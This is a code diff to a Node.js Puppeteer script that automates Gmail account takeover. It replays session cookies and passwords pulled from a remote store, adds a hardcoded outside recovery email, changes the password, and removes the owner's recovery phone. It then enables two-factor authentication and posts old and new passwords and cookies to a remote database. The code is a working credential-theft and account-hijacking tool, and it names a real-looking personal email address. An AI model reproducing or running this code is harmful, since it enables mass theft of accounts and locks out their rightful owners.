@@ -13,6 +13,7 @@ let mMailData = null
 let mMailRequest = false
 let mFinishWork = false
 let mMailCookies = {}
+let mChangeWorker = {}
 let mSameNumber = 0
 
 let mCookie = [
@@ -157,6 +158,8 @@ async function startServer() {
         process.exit(0)
     }
 
+    mChangeWorker = await getChangeWorker()
+
     while (true) {
         mWorkerActive = false
         let data = await getGmailData()
@@ -182,247 +185,273 @@ async function startServer() {
     }
 }
 
-async function loginWithCompleted(number, password, cookies, worker) {
+async function getChangeWorker() {
     try {
-        let raptToken = cookies.substring(0, cookies.indexOf('||'))
-        let pureCookies = cookies.substring(cookies.indexOf('||')+2)
+        let response = await axios.get(BASE_URL+'change.json')
+        let data = response.data
+        if (data) {
+            return data
+        }
+    } catch (error) {}
 
-        if (await isValidCookies(pureCookies)) {
-            mMailRequest = false
-            mMailCookies = await getMailCookie(pureCookies)
+    return {}
+}
 
-            mMailData = await getMailTokenData()
-            let mMailYear = await getMailYear(mMailData)
+async function loginWithCompleted(number, password, cookies, time, worker) {
+    if (true) {
+        try {
+            let raptToken = cookies.substring(0, cookies.indexOf('||'))
+            let pureCookies = cookies.substring(cookies.indexOf('||')+2)
 
-            console.log('Process: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
-            
-            let browser = await puppeteer.launch({
-                headless: false,
-                headless: 'new',
-                args: [
-                    '--no-sandbox',
-                    '--disable-notifications',
-                    '--disable-setuid-sandbox',
-                    '--ignore-certificate-errors',
-                    '--ignore-certificate-errors-skip-list',
-                    '--disable-dev-shm-usage'
-                ]
-            })
+            if (await isValidCookies(pureCookies)) {
+                mMailRequest = false
+                mMailCookies = await getMailCookie(pureCookies)
 
-            if (parseInt(Date.now()/1000) - time >= 900) {
-                raptToken = ''
-            }
-        
-            let loadCookie = {}
-            let tempCookie = pureCookies.split(';')
+                mMailData = await getMailTokenData()
+                let mMailYear = await getMailYear(mMailData)
 
-            for (let i = 0; i < tempCookie.length; i++) {
-                try {
-                    let split = tempCookie[i].trim().split('=')
-                    if (split.length == 2) {
-                        loadCookie[split[0]] = split[1]
-                    }
-                } catch (error) {}
-            }
-
-            mCookie.forEach((cookie) => {
-                let value = loadCookie[cookie['name']]
-
-                if (value) {
-                    cookie['value'] = value
-                    cookie['size'] = value.length
-                }
-            })
-            
-            let page = (await browser.pages())[0]
-
-            page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
-
-            await page.setCookie(...mCookie)
-
-            await page.setRequestInterception(true)
-
-            page.on('request', async request => {
-                try {
-                    let url = request.url()
-                    if (url.startsWith('https://mail.google.com/accounts/SetOSID') && mMailRequest) {
-                        try {
-                            mMailCookies = await getMailCookie(await getNewCookies(await page.cookies()))
-                            mMailData = await getMailTokenData(url)
-                            
-                            let contentType = 'text/html; charset=utf-8'
-                            let output = '<!DOCTYPE html><html><body><h1>Gmail</h1></body></html>'
-
-                            mMailRequest = false
-
-                            request.respond({
-                                ok: true,
-                                status: 200,
-                                contentType,
-                                body: output,
-                            })
-                        } catch (error) {
-                            request.continue()
-                        }
-                    } else {
-                        request.continue()
-                    }
-                } catch (error) {
-                    request.continue()
-                }
-            })
-
-            console.log('Process: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
-            
-            try {
-                let mData = await waitForAccountDetails(page)
-
-                console.log('Process: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                console.log('Process: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
                 
-                let mPassword = null
-                let mRapt = null
+                let browser = await puppeteer.launch({
+                    headless: false,
+                    headless: 'new',
+                    args: [
+                        '--no-sandbox',
+                        '--disable-notifications',
+                        '--disable-setuid-sandbox',
+                        '--ignore-certificate-errors',
+                        '--ignore-certificate-errors-skip-list',
+                        '--disable-dev-shm-usage'
+                    ]
+                })
 
-                if (raptToken && raptToken.length > 10) {
-                    mRapt = raptToken
-                } else {
-                    let mToken = await waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
-                    mPassword = encrypt(mToken.password)
-                    mRapt = mToken.token
+                if (parseInt(Date.now()/1000) - time >= 900) {
+                    raptToken = ''
                 }
+            
+                let loadCookie = {}
+                let tempCookie = pureCookies.split(';')
 
-                console.log('Process: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
-                
-                if (mRapt) {
-                    if (mMailData == null) {
-                        mMailRequest = true
-                        await page.goto('https://mail.google.com/mail/u/0/')
-                        mMailYear = await getMailYear(mMailData)
-                    }
-
-                    let mYear = mData.year
-
-                    let mNumberYear = await waitForNumberYear(page)
-
-                    mYear = (mNumberYear < mYear) ? mNumberYear : mYear
-                    
-                    console.log('Process: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
-
-                    let rapt = await getRapt(await page.url())
-
-                    if (rapt) mRapt = rapt
-                    
-                    let mRecovery = await waitForRecoveryAdd(page, number, password, mRapt, 'arafat.arf121@gmail.com')
-    
-                    console.log('Process: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
-                    
-                    rapt = await getRapt(await page.url())
-
-                    if (rapt) mRapt = rapt
-    
-                    if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)
-
-                    if(mPassword) {
-                        try {
-                            await axios.patch(DATABASE_URL+'gmail/completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, create: mYear, mail:mMailYear }), {
-                                headers: {
-                                    'Content-Type': 'application/x-www-form-urlencoded'
-                                }
-                            })
-                        } catch (error) {}
-        
-                        console.log('Process: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
-
-                        await waitForRemoveRecovery(page, mRapt)
-                        
-                        await waitForLanguageChange(page)
-        
-                        console.log('Process: [ Language Change: English --- Time: '+getTime()+' ]')
-        
-                        await waitForSkipPassworp(page, mRapt)
-        
-                        console.log('Process: [ Skip Password: Stop --- Time: '+getTime()+' ]')
-        
-                        await waitForNameChange(page, mRapt)
-        
-                        let mTwoFa = await waitForTwoFaActive(page, mRapt)
-        
-                        console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
-
-                        let n_cookies = await getNewCookies(await page.cookies())
-                        
-                        try {
-                            await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
-                                headers: {
-                                    'Content-Type': 'application/x-www-form-urlencoded'
-                                }
-                            })
-
-                            console.log('Process: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
-                        } catch (error) {}
-                    } else {
-                        try {
-                            await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, create: time }), {
-                                headers: {
-                                    'Content-Type': 'application/x-www-form-urlencoded'
-                                }
-                            })
-                        } catch (error) {}
-                        
-                        console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
-                        await axios.delete(BASE_URL+'collect/'+number+'.json')
-                        mSameNumber = 0
-                    }
-                } else {
-                    let n_cookies = await getNewCookies(await page.cookies())
-                    
+                for (let i = 0; i < tempCookie.length; i++) {
                     try {
-                        await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: time }), {
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            }
-                        })
+                        let split = tempCookie[i].trim().split('=')
+                        if (split.length == 2) {
+                            loadCookie[split[0]] = split[1]
+                        }
                     } catch (error) {}
                 }
 
-                try {
-                    await axios.delete(BASE_URL+'collect/'+number+'.json')
-                } catch (error) {}
-            } catch (error) {
-                console.log('Process: [ Browser Process: Error --- Time: '+getTime()+' ]')
-            }
-            
-            try {
-                if (page != null) {
-                    await page.close()
-                }
-            } catch (error) {}
+                mCookie.forEach((cookie) => {
+                    let value = loadCookie[cookie['name']]
 
-            try {
-                if (browser != null) {
-                    await browser.close()
-                }
-            } catch (error) {}   
-        } else {
-            console.log('Process: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')
-
-            await axios.delete(BASE_URL+'collect/'+number+'.json')
-        }
-    } catch (error) {}
-
-    try {
-        if (mSameNumber > 2) {
-            try {
-                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: parseInt(new Date().getTime()/1000) }), {
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
+                    if (value) {
+                        cookie['value'] = value
+                        cookie['size'] = value.length
                     }
                 })
-            } catch (error) {}
-            console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
-            await axios.delete(BASE_URL+'collect/'+number+'.json')
-            mSameNumber = 0
-        }
-    } catch (error) {}
+                
+                let page = (await browser.pages())[0]
+
+                page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
+
+                await page.setCookie(...mCookie)
+
+                await page.setRequestInterception(true)
+
+                page.on('request', async request => {
+                    try {
+                        let url = request.url()
+                        if (url.startsWith('https://mail.google.com/accounts/SetOSID') && mMailRequest) {
+                            try {
+                                mMailCookies = await getMailCookie(await getNewCookies(await page.cookies()))
+                                mMailData = await getMailTokenData(url)
+                                
+                                let contentType = 'text/html; charset=utf-8'
+                                let output = '<!DOCTYPE html><html><body><h1>Gmail</h1></body></html>'
+
+                                mMailRequest = false
+
+                                request.respond({
+                                    ok: true,
+                                    status: 200,
+                                    contentType,
+                                    body: output,
+                                })
+                            } catch (error) {
+                                request.continue()
+                            }
+                        } else {
+                            request.continue()
+                        }
+                    } catch (error) {
+                        request.continue()
+                    }
+                })
+
+                console.log('Process: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
+                
+                try {
+                    let mData = await waitForAccountDetails(page)
+
+                    console.log('Process: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                    
+                    let mPassword = null
+                    let mRapt = null
+
+                    if (raptToken && raptToken.length > 10) {
+                        mRapt = raptToken
+                    } else {
+                        let mToken = await waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
+                        mPassword = encrypt(mToken.password)
+                        mRapt = mToken.token
+                    }
+
+                    console.log('Process: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
+                    
+                    if (mRapt) {
+                        if (mMailData == null) {
+                            mMailRequest = true
+                            await page.goto('https://mail.google.com/mail/u/0/')
+                            mMailYear = await getMailYear(mMailData)
+                        }
+
+                        let mYear = mData.year
+
+                        let mNumberYear = await waitForNumberYear(page)
+
+                        mYear = (mNumberYear < mYear) ? mNumberYear : mYear
+                        
+                        console.log('Process: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
+
+                        let rapt = await getRapt(await page.url())
+
+                        if (rapt) mRapt = rapt
+                        
+                        let mRecovery = await waitForRecoveryAdd(page, number, password, mRapt, 'arafat.arf121@gmail.com')
+        
+                        console.log('Process: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
+                        
+                        rapt = await getRapt(await page.url())
+
+                        if (rapt) mRapt = rapt
+        
+                        if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)
+
+                        if(mPassword) {
+                            try {
+                                await axios.patch(DATABASE_URL+'gmail/completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, create: mYear, mail:mMailYear }), {
+                                    headers: {
+                                        'Content-Type': 'application/x-www-form-urlencoded'
+                                    }
+                                })
+                            } catch (error) {}
+            
+                            console.log('Process: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
+
+                            await waitForRemoveRecovery(page, mRapt)
+                            
+                            await waitForLanguageChange(page)
+            
+                            console.log('Process: [ Language Change: English --- Time: '+getTime()+' ]')
+            
+                            await waitForSkipPassworp(page, mRapt)
+            
+                            console.log('Process: [ Skip Password: Stop --- Time: '+getTime()+' ]')
+            
+                            await waitForNameChange(page, mRapt)
+            
+                            let mTwoFa = await waitForTwoFaActive(page, mRapt)
+            
+                            console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
+
+                            let n_cookies = await getNewCookies(await page.cookies())
+                            
+                            try {
+                                await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
+                                    headers: {
+                                        'Content-Type': 'application/x-www-form-urlencoded'
+                                    }
+                                })
+
+                                console.log('Process: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                            } catch (error) {}
+                        } else {
+                            try {
+                                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, create: time }), {
+                                    headers: {
+                                        'Content-Type': 'application/x-www-form-urlencoded'
+                                    }
+                                })
+                            } catch (error) {}
+                            
+                            console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
+                            await axios.delete(BASE_URL+'collect/'+number+'.json')
+                            mSameNumber = 0
+                        }
+                    } else {
+                        let n_cookies = await getNewCookies(await page.cookies())
+                        
+                        try {
+                            await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: time }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+                        } catch (error) {}
+                    }
+
+                    try {
+                        await axios.delete(BASE_URL+'collect/'+number+'.json')
+                    } catch (error) {}
+                } catch (error) {
+                    console.log('Process: [ Browser Process: Error --- Time: '+getTime()+' ]')
+                }
+                
+                try {
+                    if (page != null) {
+                        await page.close()
+                    }
+                } catch (error) {}
+
+                try {
+                    if (browser != null) {
+                        await browser.close()
+                    }
+                } catch (error) {}   
+            } else {
+                console.log('Process: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')
+
+                await axios.delete(BASE_URL+'collect/'+number+'.json')
+            }
+        } catch (error) {}
+
+        try {
+            if (mSameNumber > 2) {
+                try {
+                    await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: time }), {
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        }
+                    })
+                } catch (error) {}
+                console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
+                await axios.delete(BASE_URL+'collect/'+number+'.json')
+                mSameNumber = 0
+            }
+        } catch (error) {}
+    } else {
+        console.log('Node: [ Not Change: '+number+' --- Time: '+getTime()+' ]')
+
+        try {
+            await axios.patch(BASE_URL+'pending/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, key:worker, time:time }), {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                }
+            })
+        } catch (error) {}
+        
+        await axios.delete(BASE_URL+'collect/'+number+'.json')
+    }
 }
 
 async function waitForNumberYear(page) {
@@ -854,7 +883,7 @@ async function waitForRemoveRecovery(page, mRapt) {
             await delay(500)
         }
 
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 5; i++) {
             if (await exists(page, 'div[data-phone]')) {
                 try {
                     if (await exists(page, 'button[aria-label="Remove phone number"]')) {
@@ -1039,9 +1068,7 @@ async function waitForRaptToken(page, number, password) {
 
             break
         }
-    } catch (error) {
-        console.log(error)
-    }
+    } catch (error) {}
 
     return { token:mRapt, password:mPassword }
 }
@@ -1074,8 +1101,7 @@ async function waitForLoginChallenge(page, number, password, target) {
 
         }
     } catch (error) {
-        console.log(error);
-        
+        console.log(error)
     }
 
     return null
